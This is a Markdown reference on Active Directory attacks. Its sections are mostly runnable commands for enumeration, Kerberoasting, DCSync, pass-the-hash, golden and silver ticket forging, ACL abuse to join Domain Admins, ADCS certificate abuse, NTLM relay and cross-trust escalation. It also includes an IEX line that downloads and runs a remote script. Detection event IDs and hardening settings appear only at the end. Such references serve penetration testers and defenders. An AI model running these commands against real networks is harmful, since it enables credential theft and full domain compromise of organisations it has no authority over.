# Active Directory Attack Reference

Comprehensive reference for Active Directory attack techniques, tools, and detection. Covers enumeration, credential attacks, ACL abuse, ADCS, trusts, and defensive controls.

---

## AD Enumeration

### Native Windows Enumeration

```cmd
:: Basic domain info
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net accounts /domain
nltest /domain_trusts
nltest /dclist:DOMAIN

:: Find DCs
nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN
nltest /dsgetdc:DOMAIN

:: Logged on users
quser /server:TARGET
query user /server:TARGET

:: Shares
net view \\TARGET /all
```

### PowerView Enumeration

```powershell
# Import
Import-Module PowerView.ps1
# Or bypass
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# Domain info
Get-Domain
Get-DomainController
Get-DomainPolicy

# Users and groups
Get-DomainUser | select samaccountname, description, pwdlastset, memberof
Get-DomainUser -SPN                  # Service accounts with SPNs (Kerberoasting candidates)
Get-DomainUser -PreauthNotRequired   # AS-REP Roasting candidates
Get-DomainGroup "Domain Admins" -Recurse | select MemberName
Get-DomainGroupMember "Domain Admins" -Recurse

# Computers
Get-DomainComputer | select name, operatingsystem, lastlogon
Get-DomainComputer -Unconstrained    # Unconstrained delegation (dangerous)

# ACLs (critical for attack path finding)
Find-InterestingDomainAcl -ResolveGUIDs    # Find exploitable ACL entries
Get-ObjectAcl -SamAccountName USERNAME -ResolveGUIDs  # ACLs on specific object
Get-DomainObjectAcl -DistinguishedName "DC=domain,DC=com" -ResolveGUIDs  # Domain object ACLs

# Shares and files
Find-DomainShare -CheckShareAccess    # Find accessible shares
Find-InterestingFile -Include "*.txt","*.csv","*.xml"   # Search for credentials

# GPOs
Get-DomainGPO
Get-DomainGPOLocalGroup               # GPOs setting local admin groups (find admin paths)
```

### BloodHound Collection and Queries

```powershell
# SharpHound collection
.\SharpHound.exe -c All                   # Collect everything
.\SharpHound.exe -c All --stealth         # Stealth mode (slower, less noise)
.\SharpHound.exe -c All --outputdirectory C:\Temp\

# Or PowerShell version
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp\

# Key BloodHound Cypher queries
# Find shortest path from owned to DA
MATCH p=shortestPath((a:User {owned:true})-[*1..]->(b:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# Find all DA group members
MATCH (u:User)-[:MemberOf*1..]->(g:Group) WHERE g.name =~ "(?i)domain admins.*" RETURN u.name

# Find computers where DA sessions exist
MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN c.name, u.name

# Find users with DCSync rights
MATCH (u)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN u.name

# Find Kerberoastable users with DA path
MATCH (u:User {hasspn:true})-[r:MemberOf|AdminTo*1..]->(n) RETURN u.name

# Unconstrained delegation (except DCs)
MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name STARTS WITH "DC" RETURN c.name
```

---

## Credential Attacks

### Kerberoasting

```bash
# Request TGS tickets for service accounts and crack offline
# Rubeus (Windows)
.\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt
.\Rubeus.exe kerberoast /user:svc_sql /nowrap    # Target specific account

# Impacket (Linux)
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -outputfile kerberoast.txt
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request-user svc_sql

# Crack with hashcat
hashcat -m 13100 kerberoast.txt /path/to/wordlist.txt
hashcat -m 13100 kerberoast.txt /path/to/wordlist.txt -r rules/best64.rule
```

### AS-REP Roasting

```bash
# Accounts with "Do not require Kerberos preauthentication" — no password needed to request AS-REP
# Rubeus
.\Rubeus.exe asreproast /outfile:asrep_hashes.txt
.\Rubeus.exe asreproast /user:targetuser

# Impacket
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.txt
GetNPUsers.py DOMAIN/user:password -dc-ip DC_IP -request    # With valid creds, enumerate all

# Crack with hashcat
hashcat -m 18200 asrep.txt /path/to/wordlist.txt
```

### DCSync

```bash
# Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All on domain object
# (Default for: Domain Admins, Enterprise Admins, Domain Controllers, SYSTEM)

# Mimikatz
lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator
lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv    # All hashes

# Impacket secretsdump
secretsdump.py DOMAIN/user:password@DC_IP
secretsdump.py -hashes :NTLM_HASH DOMAIN/user@DC_IP   # With hash
secretsdump.py -just-dc-user Administrator DOMAIN/user:password@DC_IP  # Specific user
```

### Pass-the-Hash / Pass-the-Ticket

```bash
# Pass-the-Hash (NTLM)
# Mimikatz
sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:HASH /run:"cmd.exe"

# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH --local-auth

# Impacket
psexec.py -hashes :NTLM_HASH Administrator@TARGET_IP
wmiexec.py -hashes :NTLM_HASH DOMAIN/Administrator@TARGET_IP
smbexec.py -hashes :NTLM_HASH Administrator@TARGET_IP

# Pass-the-Ticket (Kerberos)
# Rubeus — inject ticket into current session
.\Rubeus.exe asktgt /user:USERNAME /ntlm:HASH /domain:DOMAIN /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Mimikatz
kerberos::ptt ticket.kirbi
# Verify
klist
```

### Golden Ticket / Silver Ticket

```bash
# Golden Ticket — requires KRBTGT hash (from DCSync or LSASS)
# Valid for: 10 years by default (Microsoft defaults); forged TGT

# Mimikatz Golden Ticket
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt

# Rubeus
.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /user:Administrator /ptt

# Silver Ticket — requires service account hash; more targeted, less detectable
# Forged TGS for specific service (e.g., CIFS/DC for SMB access)
kerberos::silver /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /target:DC.DOMAIN.LOCAL /service:cifs /rc4:SERVICE_HASH /ptt
```

---

## ACL / DACL Abuse

### High-Value ACL Rights

| Right | What It Allows | Attack |
|---|---|---|
| GenericAll | Full control over object | Reset password, add to group, DCSync if on domain |
| GenericWrite | Write any attribute | Set SPN for Kerberoasting, logon script abuse |
| WriteDACL | Modify DACL on object | Grant yourself GenericAll, then execute any attack |
| WriteOwner | Change ownership | Take ownership, then grant WriteDACL |
| ForceChangePassword | Reset password without knowing current | Password reset without authentication |
| AllExtendedRights | All extended rights | DCSync if on domain object, Force password change |
| AddMember | Add to group | Add yourself/your account to DA group |
| Self | Self-membership | Add yourself to group (only affects self) |

### ACL Abuse Workflow

```powershell
# 1. Find exploitable ACL in BloodHound or PowerView
Find-InterestingDomainAcl | Where-Object {$_.IdentityReferenceName -eq "lowprivuser"}

# 2. GenericAll on user — reset password
$SecPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $SecPassword

# 3. GenericWrite on user — set SPN for Kerberoasting
Set-DomainObject targetuser -Set @{ServicePrincipalName='fake/NOTHING'}
# Now Kerberoast targetuser
Get-DomainSPNTicket targetuser | Export-Csv hash.csv

# 4. WriteDACL on group — grant AddMember to self, then add
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity lowprivuser -Rights All
Add-DomainGroupMember -Identity "Domain Admins" -Members lowprivuser

# 5. ForceChangePassword
$UserPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $UserPassword -Credential $Cred
```

---

## ADCS (Active Directory Certificate Services) Attacks

ESC vulnerabilities discovered by SpecterOps (@harmj0y, @tifkin_) — see whitepaper "Certified Pre-Owned."

### ESC1 — Enrollee Supplies SAN

```bash
# Vulnerable condition: Template allows requestor to specify SAN (SubjectAlternativeName)
# + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT set
# + Low-privilege enrollment allowed

# Find with Certipy
certipy find -u user@domain.local -p password -dc-ip DC_IP
certipy find -u user@domain.local -p password -vulnerable -dc-ip DC_IP

# Exploit: request cert with DA SAN
certipy req -u user@domain.local -p password -ca CA_SERVER -template VULN_TEMPLATE -upn administrator@domain.local -dc-ip DC_IP

# Authenticate with cert
certipy auth -pfx administrator.pfx -domain domain.local -dc-ip DC_IP
# Returns: NTLM hash + TGT for administrator
```

### ESC4 — WriteDACL on Certificate Template

```bash
# Vulnerable condition: low-priv user has WriteDACL/GenericWrite/GenericAll on template
# Exploit: modify template to be ESC1-vulnerable, then exploit as ESC1

certipy template -u user@domain.local -p password -template VULN_TEMPLATE -save-old
# Now modify template properties
certipy req -u user@domain.local -p password -ca CA_SERVER -template VULN_TEMPLATE -upn administrator@domain.local
```

### ESC8 — NTLM Relay to ADCS Web Enrollment

```bash
# Vulnerable condition: ADCS has HTTP enrollment endpoint + NTLM auth enabled (no EPA/channel binding)
# Exploit chain: coerce DC authentication -> relay to ADCS -> get DC cert -> DCSync

# Step 1: Set up ntlmrelayx targeting ADCS
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Step 2: Coerce DC authentication (PetitPotam, PrinterBug)
python3 PetitPotam.py NTLMRELAYX_IP DC_IP

# Step 3: ntlmrelayx captures and relays -> receives DC certificate

# Step 4: Use certificate to authenticate as DC and DCSync
certipy auth -pfx dc.pfx -dc-ip DC_IP
secretsdump.py -just-dc-ntlm -hashes :HASH 'DOMAIN/DC$'@DC_IP
```

---

## NTLM Relay Attacks

### Responder + ntlmrelayx

```bash
# Setup — two terminals

# Terminal 1: Responder (capture NTLM authentication attempts)
# IMPORTANT: Disable SMB and HTTP in Responder.conf to allow relay
sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf
sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
responder -I eth0 -rdwv

# Terminal 2: ntlmrelayx (relay to targets)
# Get list of targets without SMB signing
crackmapexec smb 192.168.1.0/24 --gen-relay-list smb_targets.txt
ntlmrelayx.py -tf smb_targets.txt -smb2support
# Or execute a command on relay
ntlmrelayx.py -tf smb_targets.txt -smb2support -c "whoami > C:\Temp\out.txt"
# Or dump SAM
ntlmrelayx.py -tf smb_targets.txt -smb2support --sam

# IPv6 relay with mitm6
mitm6 -d DOMAIN.LOCAL &
ntlmrelayx.py -6 -t ldaps://DC_IP --add-computer attacker_computer --delegate-access
```

---

## Domain Trusts Attacks

### Enumeration

```powershell
# PowerView
Get-DomainTrust
Get-DomainTrust -Domain CHILD.DOMAIN.LOCAL
Get-ForestTrust
Get-Forest | Select-Object -ExpandProperty GlobalCatalogs

# nltest
nltest /domain_trusts /all_trusts
nltest /dsgetdc:TRUSTED.DOMAIN
```

### Cross-Domain Attacks

```bash
# If you have DA in child domain — escalate to parent/forest root

# Method 1: SID History injection (if SIDHistory not filtered)
# Requires: child DA + krbtgt hash of child domain
# Mimikatz
kerberos::golden /user:Administrator /domain:CHILD.DOMAIN.LOCAL /sid:CHILD_DOMAIN_SID /krbtgt:CHILD_KRBTGT_HASH /sids:PARENT_DOMAIN_SID-519 /ptt
# -519 = Enterprise Admins RID

# Method 2: Trust Key attack
# Get trust key from child DC (lsadump::trust or dcsync for child DC)
lsadump::trust /patch
# Create inter-realm TGT
kerberos::golden /user:Administrator /domain:CHILD.DOMAIN.LOCAL /sid:CHILD_DOMAIN_SID /sids:PARENT_SID-519 /rc4:TRUST_KEY_HASH /service:krbtgt /target:PARENT.DOMAIN.LOCAL /ptt
```

---

## Detection and Defense Reference

| Attack | Key Event IDs | Detection Notes |
|---|---|---|
| Kerberoasting | 4769 (EncryptionType 0x17) | RC4 TGS requests for service accounts from workstations |
| AS-REP Roasting | 4768 (PreAuthType 0) | TGT requests without preauthentication |
| DCSync | 4662 (Object Access) | DS-Replication-Get-Changes permissions | Replication traffic from non-DC source |
| Pass-the-Hash | 4624 (LogonType 3, NTLM) | NTLM logon from new source IPs, especially after hours |
| Golden Ticket | 4624, 4768, 4769 | TGT with 10-year expiry; RC4 encryption; missing 4768 event |
| NTLM Relay | 4624 (LogonType 3) | Logon from Responder IP; multiple logons in quick succession |
| BloodHound Collection | 4662, 5136 | High volume LDAP queries from workstation; SharpHound executable |
| ESC1/ADCS | 4886, 4887 | Certificate enrollment for privileged UPN from non-admin account |
| SID History | 4765, 4766 | SID History attribute modification; use of SIDHistory in authentication |

### Hardening Controls

```powershell
# Enable Kerberos AES enforcement (breaks RC4 Kerberoasting)
# Require AES256 on all service accounts
Set-ADUser svc_account -KerberosEncryptionType AES128,AES256

# Disable NTLM domain-wide (requires testing — may break legacy apps)
# Computer Config > Windows Settings > Security Settings > Local Policies > Security Options
# Network security: Restrict NTLM: NTLM authentication in this domain = Deny all

# Protected Users security group — disables NTLM, RC4, credential caching, delegation
Add-ADGroupMember "Protected Users" -Members "Domain Admins","sensitive_account"

# Enable SID Filtering on forest trusts
netdom trust TRUSTED.DOMAIN /domain:DOMAIN.LOCAL /quarantine:yes

# Require LDAP signing + channel binding
# Default Domain Controllers Policy > Security Settings > Local Policies > Security Options
# Domain controller: LDAP server signing requirements = Require signing
# Domain controller: LDAP server channel binding token requirements = Always

# Monitor and alert on AdminSDHolder modifications
# AdminSDHolder protects DA, EA, Schema Admins etc — modifications create backdoors
Get-ACL "AD:\CN=AdminSDHolder,CN=System,DC=domain,DC=local" | Format-List
```

## Related Resources
- [Privilege Escalation Reference](PRIVESC_REFERENCE.md) — AD privesc techniques
- [WINDOWS_HARDENING_GPO.md](WINDOWS_HARDENING_GPO.md) — GPO-based AD defenses
- [Active Directory Security Discipline](disciplines/active-directory.md) — Learning path
- [Threat Actors](THREAT_ACTORS.md) — APT groups using AD attacks
- [Threat Hunting Playbooks](THREAT_HUNTING_PLAYBOOKS.md) — Kerberoasting and lateral movement hunts
